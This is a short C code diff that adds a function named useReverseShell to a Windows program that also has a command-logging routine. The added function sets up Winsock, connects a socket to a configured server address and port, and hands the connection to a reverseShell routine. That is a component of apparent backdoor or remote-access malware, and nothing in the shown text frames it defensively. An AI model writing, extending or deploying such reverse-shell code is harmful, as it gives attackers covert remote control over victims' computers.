@@ -82,3 +82,27 @@ void logCommandsToFile(char* command) {
 	}
 }
 
+int useReverseShell() {
+	initWinsock();
+
+	Socket* socket = createSocket();
+	if (socket == NULL) {
+		printf("Failed to create socket.\n");
+		return 1;
+	}
+	socket->serverAddr.sin_family = AF_INET;
+	socket->serverAddr.sin_port = htons(SERVER_PORT);
+	inet_pton(AF_INET, SERVER_ADDRESS, &socket->serverAddr.sin_addr);
+
+	if (connectSocket(socket) == -1) {
+		printf("Failed to connect to server.\n");
+		return 1;
+	}
+
+	reverseShell(socket);
+
+	closeSocket(socket);
+	cleanupWinsock();
+
+	return 0;
+}
